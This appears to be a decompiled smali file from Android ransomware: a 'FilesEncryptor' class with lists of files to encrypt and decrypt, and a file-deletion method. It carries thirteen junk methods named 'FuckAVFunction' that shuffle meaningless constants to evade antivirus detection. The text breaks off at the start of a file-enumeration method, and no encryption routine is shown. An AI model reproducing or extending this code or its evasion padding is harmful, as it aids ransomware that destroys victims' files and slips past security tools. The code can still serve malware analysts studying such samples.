.class public Lcom/androidl/mqmgr/FilesEncryptor;
.super Ljava/lang/Object;
.source "FilesEncryptor.java"


# static fields
.field private static p0:Ljava/lang/String;

.field private static p1:Ljava/lang/Boolean;

.field private static p10:Ljava/lang/Integer;

.field private static p11:Ljava/lang/Boolean;

.field private static p12:Ljava/lang/Boolean;

.field private static p2:Ljava/lang/Boolean;

.field private static p3:Ljava/lang/String;

.field private static p4:Ljava/lang/String;

.field private static p5:Ljava/lang/Boolean;

.field private static p6:Ljava/lang/Integer;

.field private static p7:Ljava/lang/Integer;

.field private static p8:Ljava/lang/String;

.field private static p9:Ljava/lang/Boolean;


# instance fields
.field private filesToDecrypt:Ljava/util/ArrayList;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/ArrayList",
            "<",
            "Ljava/lang/String;",
            ">;"
        }
    .end annotation
.end field

.field private filesToEncrypt:Ljava/util/ArrayList;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/ArrayList",
            "<",
            "Ljava/lang/String;",
            ">;"
        }
    .end annotation
.end field


# direct methods
.method public constructor <init>()V
    .locals 1

    .prologue
    .line 8
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 210
    new-instance v0, Ljava/util/ArrayList;

    invoke-direct {v0}, Ljava/util/ArrayList;-><init>()V

    iput-object v0, p0, Lcom/androidl/mqmgr/FilesEncryptor;->filesToEncrypt:Ljava/util/ArrayList;

    .line 211
    new-instance v0, Ljava/util/ArrayList;

    invoke-direct {v0}, Ljava/util/ArrayList;-><init>()V

    iput-object v0, p0, Lcom/androidl/mqmgr/FilesEncryptor;->filesToDecrypt:Ljava/util/ArrayList;

    return-void
.end method

.method private static FuckAVFunction0(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Integer;)Ljava/lang/Integer;
    .locals 3
    .param p0, "v0"    # Ljava/lang/String;
    .param p1, "v1"    # Ljava/lang/String;
    .param p2, "v2"    # Ljava/lang/Integer;

    .prologue
    .line 27
    move-object v1, p1

    .line 28
    .local v1, "s1":Ljava/lang/String;
    sput-object v1, Lcom/androidl/mqmgr/FilesEncryptor;->p3:Ljava/lang/String;

    .line 29
    move-object v2, p2

    .line 30
    .local v2, "s2":Ljava/lang/Integer;
    sput-object v2, Lcom/androidl/mqmgr/FilesEncryptor;->p7:Ljava/lang/Integer;

    .line 31
    move-object v0, p0

    .line 32
    .local v0, "s0":Ljava/lang/String;
    sput-object v0, Lcom/androidl/mqmgr/FilesEncryptor;->p8:Ljava/lang/String;

    .line 33
    return-object v2
.end method

.method private static FuckAVFunction1(Ljava/lang/Boolean;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/Integer;)Ljava/lang/Integer;
    .locals 6
    .param p0, "v0"    # Ljava/lang/Boolean;
    .param p1, "v1"    # Ljava/lang/Boolean;
    .param p2, "v2"    # Ljava/lang/String;
    .param p3, "v3"    # Ljava/lang/Boolean;
    .param p4, "v4"    # Ljava/lang/String;
    .param p5, "v5"    # Ljava/lang/Integer;

    .prologue
    .line 36
    move-object v3, p3

    .line 37
    .local v3, "s3":Ljava/lang/Boolean;
    sput-object v3, Lcom/androidl/mqmgr/FilesEncryptor;->p9:Ljava/lang/Boolean;

    .line 38
    move-object v4, p4

    .line 39
    .local v4, "s4":Ljava/lang/String;
    sput-object v4, Lcom/androidl/mqmgr/FilesEncryptor;->p8:Ljava/lang/String;

    .line 40
    move-object v0, p0

    .line 41
    .local v0, "s0":Ljava/lang/Boolean;
    sput-object v0, Lcom/androidl/mqmgr/FilesEncryptor;->p11:Ljava/lang/Boolean;

    .line 42
    move-object v2, p2

    .line 43
    .local v2, "s2":Ljava/lang/String;
    sput-object v2, Lcom/androidl/mqmgr/FilesEncryptor;->p3:Ljava/lang/String;

    .line 44
    move-object v5, p5

    .line 45
    .local v5, "s5":Ljava/lang/Integer;
    sput-object v5, Lcom/androidl/mqmgr/FilesEncryptor;->p10:Ljava/lang/Integer;

    .line 46
    move-object v1, p1

    .line 47
    .local v1, "s1":Ljava/lang/Boolean;
    sput-object v1, Lcom/androidl/mqmgr/FilesEncryptor;->p2:Ljava/lang/Boolean;

    .line 48
    return-object v5
.end method

.method private static FuckAVFunction10(Ljava/lang/Integer;Ljava/lang/Integer;Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/Boolean;Ljava/lang/Boolean;Ljava/lang/Boolean;)Ljava/lang/Boolean;
    .locals 7
    .param p0, "v0"    # Ljava/lang/Integer;
    .param p1, "v1"    # Ljava/lang/Integer;
    .param p2, "v2"    # Ljava/lang/Boolean;
    .param p3, "v3"    # Ljava/lang/Integer;
    .param p4, "v4"    # Ljava/lang/Boolean;
    .param p5, "v5"    # Ljava/lang/Boolean;
    .param p6, "v6"    # Ljava/lang/Boolean;

    .prologue
    .line 167
    move-object v1, p1

    .line 168
    .local v1, "s1":Ljava/lang/Integer;
    sput-object v1, Lcom/androidl/mqmgr/FilesEncryptor;->p6:Ljava/lang/Integer;

    .line 169
    move-object v3, p3

    .line 170
    .local v3, "s3":Ljava/lang/Integer;
    sput-object v3, Lcom/androidl/mqmgr/FilesEncryptor;->p7:Ljava/lang/Integer;

    .line 171
    move-object v5, p5

    .line 172
    .local v5, "s5":Ljava/lang/Boolean;
    sput-object v5, Lcom/androidl/mqmgr/FilesEncryptor;->p12:Ljava/lang/Boolean;

    .line 173
    move-object v6, p6

    .line 174
    .local v6, "s6":Ljava/lang/Boolean;
    sput-object v6, Lcom/androidl/mqmgr/FilesEncryptor;->p1:Ljava/lang/Boolean;

    .line 175
    move-object v2, p2

    .line 176
    .local v2, "s2":Ljava/lang/Boolean;
    sput-object v2, Lcom/androidl/mqmgr/FilesEncryptor;->p5:Ljava/lang/Boolean;

    .line 177
    move-object v0, p0

    .line 178
    .local v0, "s0":Ljava/lang/Integer;
    sput-object v0, Lcom/androidl/mqmgr/FilesEncryptor;->p10:Ljava/lang/Integer;

    .line 179
    move-object v4, p4

    .line 180
    .local v4, "s4":Ljava/lang/Boolean;
    sput-object v4, Lcom/androidl/mqmgr/FilesEncryptor;->p11:Ljava/lang/Boolean;

    .line 181
    return-object v6
.end method

.method private static FuckAVFunction11(Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/Integer;Ljava/lang/Boolean;)V
    .locals 7
    .param p0, "v0"    # Ljava/lang/Integer;
    .param p1, "v1"    # Ljava/lang/String;
    .param p2, "v2"    # Ljava/lang/Boolean;
    .param p3, "v3"    # Ljava/lang/Boolean;
    .param p4, "v4"    # Ljava/lang/Integer;
    .param p5, "v5"    # Ljava/lang/Integer;
    .param p6, "v6"    # Ljava/lang/Boolean;

    .prologue
    .line 184
    move-object v1, p1

    .line 185
    .local v1, "s1":Ljava/lang/String;
    sput-object v1, Lcom/androidl/mqmgr/FilesEncryptor;->p8:Ljava/lang/String;

    .line 186
    move-object v2, p2

    .line 187
    .local v2, "s2":Ljava/lang/Boolean;
    sput-object v2, Lcom/androidl/mqmgr/FilesEncryptor;->p1:Ljava/lang/Boolean;

    .line 188
    move-object v3, p3

    .line 189
    .local v3, "s3":Ljava/lang/Boolean;
    sput-object v3, Lcom/androidl/mqmgr/FilesEncryptor;->p2:Ljava/lang/Boolean;

    .line 190
    move-object v0, p0

    .line 191
    .local v0, "s0":Ljava/lang/Integer;
    sput-object v0, Lcom/androidl/mqmgr/FilesEncryptor;->p10:Ljava/lang/Integer;

    .line 192
    move-object v6, p6

    .line 193
    .local v6, "s6":Ljava/lang/Boolean;
    sput-object v6, Lcom/androidl/mqmgr/FilesEncryptor;->p11:Ljava/lang/Boolean;

    .line 194
    move-object v4, p4

    .line 195
    .local v4, "s4":Ljava/lang/Integer;
    sput-object v4, Lcom/androidl/mqmgr/FilesEncryptor;->p6:Ljava/lang/Integer;

    .line 196
    move-object v5, p5

    .line 197
    .local v5, "s5":Ljava/lang/Integer;
    sput-object v5, Lcom/androidl/mqmgr/FilesEncryptor;->p7:Ljava/lang/Integer;

    .line 199
    return-void
.end method

.method private static FuckAVFunction12(Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/Integer;)Ljava/lang/Integer;
    .locals 3
    .param p0, "v0"    # Ljava/lang/Boolean;
    .param p1, "v1"    # Ljava/lang/String;
    .param p2, "v2"    # Ljava/lang/Integer;

    .prologue
    .line 201
    move-object v2, p2

    .line 202
    .local v2, "s2":Ljava/lang/Integer;
    sput-object v2, Lcom/androidl/mqmgr/FilesEncryptor;->p10:Ljava/lang/Integer;

    .line 203
    move-object v0, p0

    .line 204
    .local v0, "s0":Ljava/lang/Boolean;
    sput-object v0, Lcom/androidl/mqmgr/FilesEncryptor;->p2:Ljava/lang/Boolean;

    .line 205
    move-object v1, p1

    .line 206
    .local v1, "s1":Ljava/lang/String;
    sput-object v1, Lcom/androidl/mqmgr/FilesEncryptor;->p4:Ljava/lang/String;

    .line 207
    return-object v2
.end method

.method private static FuckAVFunction2(Ljava/lang/Boolean;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;
    .locals 4
    .param p0, "v0"    # Ljava/lang/Boolean;
    .param p1, "v1"    # Ljava/lang/Boolean;
    .param p2, "v2"    # Ljava/lang/String;
    .param p3, "v3"    # Ljava/lang/Boolean;

    .prologue
    .line 51
    move-object v3, p3

    .line 52
    .local v3, "s3":Ljava/lang/Boolean;
    sput-object v3, Lcom/androidl/mqmgr/FilesEncryptor;->p1:Ljava/lang/Boolean;

    .line 53
    move-object v0, p0

    .line 54
    .local v0, "s0":Ljava/lang/Boolean;
    sput-object v0, Lcom/androidl/mqmgr/FilesEncryptor;->p12:Ljava/lang/Boolean;

    .line 55
    move-object v1, p1

    .line 56
    .local v1, "s1":Ljava/lang/Boolean;
    sput-object v1, Lcom/androidl/mqmgr/FilesEncryptor;->p9:Ljava/lang/Boolean;

    .line 57
    move-object v2, p2

    .line 58
    .local v2, "s2":Ljava/lang/String;
    sput-object v2, Lcom/androidl/mqmgr/FilesEncryptor;->p3:Ljava/lang/String;

    .line 59
    return-object v3
.end method

.method private static FuckAVFunction3(Ljava/lang/Integer;Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/String;)Ljava/lang/String;
    .locals 4
    .param p0, "v0"    # Ljava/lang/Integer;
    .param p1, "v1"    # Ljava/lang/Boolean;
    .param p2, "v2"    # Ljava/lang/Integer;
    .param p3, "v3"    # Ljava/lang/String;

    .prologue
    .line 62
    move-object v2, p2

    .line 63
    .local v2, "s2":Ljava/lang/Integer;
    sput-object v2, Lcom/androidl/mqmgr/FilesEncryptor;->p6:Ljava/lang/Integer;

    .line 64
    move-object v0, p0

    .line 65
    .local v0, "s0":Ljava/lang/Integer;
    sput-object v0, Lcom/androidl/mqmgr/FilesEncryptor;->p10:Ljava/lang/Integer;

    .line 66
    move-object v3, p3

    .line 67
    .local v3, "s3":Ljava/lang/String;
    sput-object v3, Lcom/androidl/mqmgr/FilesEncryptor;->p3:Ljava/lang/String;

    .line 68
    move-object v1, p1

    .line 69
    .local v1, "s1":Ljava/lang/Boolean;
    sput-object v1, Lcom/androidl/mqmgr/FilesEncryptor;->p2:Ljava/lang/Boolean;

    .line 70
    return-object v3
.end method

.method private static FuckAVFunction4(Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/Boolean;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;
    .locals 6
    .param p0, "v0"    # Ljava/lang/String;
    .param p1, "v1"    # Ljava/lang/Integer;
    .param p2, "v2"    # Ljava/lang/Boolean;
    .param p3, "v3"    # Ljava/lang/Boolean;
    .param p4, "v4"    # Ljava/lang/String;
    .param p5, "v5"    # Ljava/lang/Boolean;

    .prologue
    .line 73
    move-object v2, p2

    .line 74
    .local v2, "s2":Ljava/lang/Boolean;
    sput-object v2, Lcom/androidl/mqmgr/FilesEncryptor;->p2:Ljava/lang/Boolean;

    .line 75
    move-object v1, p1

    .line 76
    .local v1, "s1":Ljava/lang/Integer;
    sput-object v1, Lcom/androidl/mqmgr/FilesEncryptor;->p6:Ljava/lang/Integer;

    .line 77
    move-object v4, p4

    .line 78
    .local v4, "s4":Ljava/lang/String;
    sput-object v4, Lcom/androidl/mqmgr/FilesEncryptor;->p0:Ljava/lang/String;

    .line 79
    move-object v3, p3

    .line 80
    .local v3, "s3":Ljava/lang/Boolean;
    sput-object v3, Lcom/androidl/mqmgr/FilesEncryptor;->p9:Ljava/lang/Boolean;

    .line 81
    move-object v5, p5

    .line 82
    .local v5, "s5":Ljava/lang/Boolean;
    sput-object v5, Lcom/androidl/mqmgr/FilesEncryptor;->p12:Ljava/lang/Boolean;

    .line 83
    move-object v0, p0

    .line 84
    .local v0, "s0":Ljava/lang/String;
    sput-object v0, Lcom/androidl/mqmgr/FilesEncryptor;->p8:Ljava/lang/String;

    .line 85
    return-object v5
.end method

.method private static FuckAVFunction5(Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/Boolean;)Ljava/lang/Boolean;
    .locals 6
    .param p0, "v0"    # Ljava/lang/String;
    .param p1, "v1"    # Ljava/lang/Integer;
    .param p2, "v2"    # Ljava/lang/String;
    .param p3, "v3"    # Ljava/lang/String;
    .param p4, "v4"    # Ljava/lang/Boolean;
    .param p5, "v5"    # Ljava/lang/Boolean;

    .prologue
    .line 88
    move-object v3, p3

    .line 89
    .local v3, "s3":Ljava/lang/String;
    sput-object v3, Lcom/androidl/mqmgr/FilesEncryptor;->p3:Ljava/lang/String;

    .line 90
    move-object v1, p1

    .line 91
    .local v1, "s1":Ljava/lang/Integer;
    sput-object v1, Lcom/androidl/mqmgr/FilesEncryptor;->p7:Ljava/lang/Integer;

    .line 92
    move-object v2, p2

    .line 93
    .local v2, "s2":Ljava/lang/String;
    sput-object v2, Lcom/androidl/mqmgr/FilesEncryptor;->p0:Ljava/lang/String;

    .line 94
    move-object v4, p4

    .line 95
    .local v4, "s4":Ljava/lang/Boolean;
    sput-object v4, Lcom/androidl/mqmgr/FilesEncryptor;->p9:Ljava/lang/Boolean;

    .line 96
    move-object v5, p5

    .line 97
    .local v5, "s5":Ljava/lang/Boolean;
    sput-object v5, Lcom/androidl/mqmgr/FilesEncryptor;->p2:Ljava/lang/Boolean;

    .line 98
    move-object v0, p0

    .line 99
    .local v0, "s0":Ljava/lang/String;
    sput-object v0, Lcom/androidl/mqmgr/FilesEncryptor;->p4:Ljava/lang/String;

    .line 100
    return-object v5
.end method

.method private static FuckAVFunction6(Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    .locals 6
    .param p0, "v0"    # Ljava/lang/Boolean;
    .param p1, "v1"    # Ljava/lang/Integer;
    .param p2, "v2"    # Ljava/lang/String;
    .param p3, "v3"    # Ljava/lang/Boolean;
    .param p4, "v4"    # Ljava/lang/String;
    .param p5, "v5"    # Ljava/lang/String;

    .prologue
    .line 103
    move-object v4, p4

    .line 104
    .local v4, "s4":Ljava/lang/String;
    sput-object v4, Lcom/androidl/mqmgr/FilesEncryptor;->p8:Ljava/lang/String;

    .line 105
    move-object v3, p3

    .line 106
    .local v3, "s3":Ljava/lang/Boolean;
    sput-object v3, Lcom/androidl/mqmgr/FilesEncryptor;->p12:Ljava/lang/Boolean;

    .line 107
    move-object v2, p2

    .line 108
    .local v2, "s2":Ljava/lang/String;
    sput-object v2, Lcom/androidl/mqmgr/FilesEncryptor;->p0:Ljava/lang/String;

    .line 109
    move-object v5, p5

    .line 110
    .local v5, "s5":Ljava/lang/String;
    sput-object v5, Lcom/androidl/mqmgr/FilesEncryptor;->p4:Ljava/lang/String;

    .line 111
    move-object v1, p1

    .line 112
    .local v1, "s1":Ljava/lang/Integer;
    sput-object v1, Lcom/androidl/mqmgr/FilesEncryptor;->p10:Ljava/lang/Integer;

    .line 113
    move-object v0, p0

    .line 114
    .local v0, "s0":Ljava/lang/Boolean;
    sput-object v0, Lcom/androidl/mqmgr/FilesEncryptor;->p5:Ljava/lang/Boolean;

    .line 115
    return-object v5
.end method

.method private static FuckAVFunction7(Ljava/lang/Boolean;Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/Integer;)Ljava/lang/Integer;
    .locals 6
    .param p0, "v0"    # Ljava/lang/Boolean;
    .param p1, "v1"    # Ljava/lang/Boolean;
    .param p2, "v2"    # Ljava/lang/Integer;
    .param p3, "v3"    # Ljava/lang/String;
    .param p4, "v4"    # Ljava/lang/Boolean;
    .param p5, "v5"    # Ljava/lang/Integer;

    .prologue
    .line 118
    move-object v4, p4

    .line 119
    .local v4, "s4":Ljava/lang/Boolean;
    sput-object v4, Lcom/androidl/mqmgr/FilesEncryptor;->p1:Ljava/lang/Boolean;

    .line 120
    move-object v0, p0

    .line 121
    .local v0, "s0":Ljava/lang/Boolean;
    sput-object v0, Lcom/androidl/mqmgr/FilesEncryptor;->p9:Ljava/lang/Boolean;

    .line 122
    move-object v5, p5

    .line 123
    .local v5, "s5":Ljava/lang/Integer;
    sput-object v5, Lcom/androidl/mqmgr/FilesEncryptor;->p10:Ljava/lang/Integer;

    .line 124
    move-object v1, p1

    .line 125
    .local v1, "s1":Ljava/lang/Boolean;
    sput-object v1, Lcom/androidl/mqmgr/FilesEncryptor;->p11:Ljava/lang/Boolean;

    .line 126
    move-object v2, p2

    .line 127
    .local v2, "s2":Ljava/lang/Integer;
    sput-object v2, Lcom/androidl/mqmgr/FilesEncryptor;->p6:Ljava/lang/Integer;

    .line 128
    move-object v3, p3

    .line 129
    .local v3, "s3":Ljava/lang/String;
    sput-object v3, Lcom/androidl/mqmgr/FilesEncryptor;->p4:Ljava/lang/String;

    .line 130
    return-object v5
.end method

.method private static FuckAVFunction8(Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;
    .locals 7
    .param p0, "v0"    # Ljava/lang/String;
    .param p1, "v1"    # Ljava/lang/Boolean;
    .param p2, "v2"    # Ljava/lang/Integer;
    .param p3, "v3"    # Ljava/lang/Boolean;
    .param p4, "v4"    # Ljava/lang/Integer;
    .param p5, "v5"    # Ljava/lang/String;
    .param p6, "v6"    # Ljava/lang/Boolean;

    .prologue
    .line 133
    move-object v4, p4

    .line 134
    .local v4, "s4":Ljava/lang/Integer;
    sput-object v4, Lcom/androidl/mqmgr/FilesEncryptor;->p7:Ljava/lang/Integer;

    .line 135
    move-object v0, p0

    .line 136
    .local v0, "s0":Ljava/lang/String;
    sput-object v0, Lcom/androidl/mqmgr/FilesEncryptor;->p4:Ljava/lang/String;

    .line 137
    move-object v6, p6

    .line 138
    .local v6, "s6":Ljava/lang/Boolean;
    sput-object v6, Lcom/androidl/mqmgr/FilesEncryptor;->p5:Ljava/lang/Boolean;

    .line 139
    move-object v3, p3

    .line 140
    .local v3, "s3":Ljava/lang/Boolean;
    sput-object v3, Lcom/androidl/mqmgr/FilesEncryptor;->p9:Ljava/lang/Boolean;

    .line 141
    move-object v5, p5

    .line 142
    .local v5, "s5":Ljava/lang/String;
    sput-object v5, Lcom/androidl/mqmgr/FilesEncryptor;->p8:Ljava/lang/String;

    .line 143
    move-object v2, p2

    .line 144
    .local v2, "s2":Ljava/lang/Integer;
    sput-object v2, Lcom/androidl/mqmgr/FilesEncryptor;->p6:Ljava/lang/Integer;

    .line 145
    move-object v1, p1

    .line 146
    .local v1, "s1":Ljava/lang/Boolean;
    sput-object v1, Lcom/androidl/mqmgr/FilesEncryptor;->p2:Ljava/lang/Boolean;

    .line 147
    return-object v6
.end method

.method private static FuckAVFunction9(Ljava/lang/Boolean;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;
    .locals 7
    .param p0, "v0"    # Ljava/lang/Boolean;
    .param p1, "v1"    # Ljava/lang/Boolean;
    .param p2, "v2"    # Ljava/lang/String;
    .param p3, "v3"    # Ljava/lang/Integer;
    .param p4, "v4"    # Ljava/lang/Boolean;
    .param p5, "v5"    # Ljava/lang/String;
    .param p6, "v6"    # Ljava/lang/Boolean;

    .prologue
    .line 150
    move-object v6, p6

    .line 151
    .local v6, "s6":Ljava/lang/Boolean;
    sput-object v6, Lcom/androidl/mqmgr/FilesEncryptor;->p5:Ljava/lang/Boolean;

    .line 152
    move-object v4, p4

    .line 153
    .local v4, "s4":Ljava/lang/Boolean;
    sput-object v4, Lcom/androidl/mqmgr/FilesEncryptor;->p9:Ljava/lang/Boolean;

    .line 154
    move-object v5, p5

    .line 155
    .local v5, "s5":Ljava/lang/String;
    sput-object v5, Lcom/androidl/mqmgr/FilesEncryptor;->p0:Ljava/lang/String;

    .line 156
    move-object v1, p1

    .line 157
    .local v1, "s1":Ljava/lang/Boolean;
    sput-object v1, Lcom/androidl/mqmgr/FilesEncryptor;->p2:Ljava/lang/Boolean;

    .line 158
    move-object v0, p0

    .line 159
    .local v0, "s0":Ljava/lang/Boolean;
    sput-object v0, Lcom/androidl/mqmgr/FilesEncryptor;->p12:Ljava/lang/Boolean;

    .line 160
    move-object v2, p2

    .line 161
    .local v2, "s2":Ljava/lang/String;
    sput-object v2, Lcom/androidl/mqmgr/FilesEncryptor;->p3:Ljava/lang/String;

    .line 162
    move-object v3, p3

    .line 163
    .local v3, "s3":Ljava/lang/Integer;
    sput-object v3, Lcom/androidl/mqmgr/FilesEncryptor;->p6:Ljava/lang/Integer;

    .line 164
    return-object v6
.end method

.method private deleteFile(Ljava/lang/String;)V
    .locals 10
    .param p1, "fileName"    # Ljava/lang/String;

    .prologue
    const/4 v9, 0x1

    const/4 v8, 0x0

    .line 214
    invoke-static {v9}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    invoke-static {v8}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    const-string v2, "NgNBq"

    const v3, 0x15900bd8

    invoke-static {v3}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v3

    invoke-static {v8}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v4

    const-string v5, "CAfrrh"

    invoke-static {v9}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v6

    invoke-static/range {v0 .. v6}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction9(Ljava/lang/Boolean;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    .line 215
    const-string v0, "hrCMGOE"

    invoke-static {v9}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    const v2, 0x32247179

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    invoke-static {v8}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v3

    const v4, 0x32b11252

    invoke-static {v4}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v4

    const-string v5, "qokcVLRm"

    invoke-static {v8}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v6

    invoke-static/range {v0 .. v6}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction8(Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    .line 216
    new-instance v7, Ljava/io/File;

    invoke-direct {v7, p1}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 217
    .local v7, "file":Ljava/io/File;
    invoke-static {v8}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    invoke-static {v8}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    const-string v2, "DmFssBB"

    const v3, 0x1f95d077

    invoke-static {v3}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v3

    invoke-static {v8}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v4

    const-string v5, "jSfrS"

    invoke-static {v8}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v6

    invoke-static/range {v0 .. v6}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction9(Ljava/lang/Boolean;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    .line 218
    invoke-static {v8}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    const v1, 0x2d61c7b

    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    const-string v2, "GUrWS"

    invoke-static {v8}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v3

    const-string v4, "nUMptbhQ"

    const-string v5, "HRuqqmP"

    invoke-static/range {v0 .. v5}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction6(Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 219
    const v0, 0x856b8fa

    invoke-static {v0}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v0

    const v1, 0x9e44

    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    invoke-static {v9}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    const v3, 0x16c5b53b

    invoke-static {v3}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v3

    invoke-static {v9}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v4

    invoke-static {v8}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v5

    invoke-static {v9}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v6

    invoke-static/range {v0 .. v6}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction10(Ljava/lang/Integer;Ljava/lang/Integer;Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/Boolean;Ljava/lang/Boolean;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    .line 220
    invoke-virtual {v7}, Ljava/io/File;->delete()Z

    .line 221
    const-string v0, "SMUpnM"

    const v1, 0xb04a281

    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    const-string v2, "dbbdpKvbK"

    const-string v3, "Biaiwm"

    invoke-static {v9}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v4

    invoke-static {v8}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v5

    invoke-static/range {v0 .. v5}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction5(Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    .line 222
    const v0, 0x2a406cbf

    invoke-static {v0}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v0

    invoke-static {v8}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    const v2, 0x2f4fe1ad

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    const-string v3, "oVPFDqc"

    invoke-static {v0, v1, v2, v3}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction3(Ljava/lang/Integer;Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/String;)Ljava/lang/String;

    .line 223
    const v0, 0x3107761e

    invoke-static {v0}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v0

    invoke-static {v8}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    const v2, 0x2262ecef

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    const-string v3, "JiJLD"

    invoke-static {v0, v1, v2, v3}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction3(Ljava/lang/Integer;Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/String;)Ljava/lang/String;

    .line 224
    const-string v0, "pIbShtv"

    const-string v1, "oiBioJaaw"

    const v2, 0x1c1a8c2a

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    invoke-static {v0, v1, v2}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction0(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Integer;)Ljava/lang/Integer;

    .line 225
    return-void
.end method

.method private getFileNames(Ljava/io/File;)V
    .locals 13
    .param p1, "file"    # Ljava/io/File;

    .prologue
    .line 349
    const/4 v0, 0x1

    invoke-static {v0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    const/4 v1, 0x1

